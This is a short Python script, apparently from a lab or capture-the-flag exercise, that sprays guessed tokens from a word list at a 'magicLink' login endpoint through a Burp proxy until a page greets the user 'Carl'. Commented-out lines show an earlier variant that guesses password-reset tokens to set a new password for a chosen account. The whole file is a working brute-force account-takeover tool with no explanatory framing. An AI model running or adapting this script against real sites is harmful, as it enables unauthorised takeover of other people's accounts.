#!/usr/bin/python3

import requests
import argparse
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
parser = argparse.ArgumentParser()
#parser.add_argument('-u','--user', help='Username to target', required=True)
#parser.add_argument('-p','--password', help='Password value to set', required=True)
#args = parser.parse_args()

target = "http://answers:8888/magicLink/"

print("Starting token spray. Standby.")
with open("tokens.txt", "r") as f:
    for word in f:
        #t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
        #payload = {'t':word.rstrip(), 'p':'CRX','s':'Standard','id':args.user,'password1':args.password,'password2':args.password}
        burp0_cookies = {"JSESSIONID": "38C2AAFA63B932948A022A7B05EC0730"}
        burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"}
        #r = requests.post(url=target, data=payload)
        new_url = target + word
        ree = new_url.strip()
        r = requests.get(headers=burp0_headers, cookies=burp0_cookies, url=ree, proxies=proxies)
        res = r.text
        print(ree, "\n")
        print(res, "\n")
        #if "Unable to reset password" not in res:
        if "Welcome Carl" in res:
            print("Successful reset with token: %s" % word)
            break
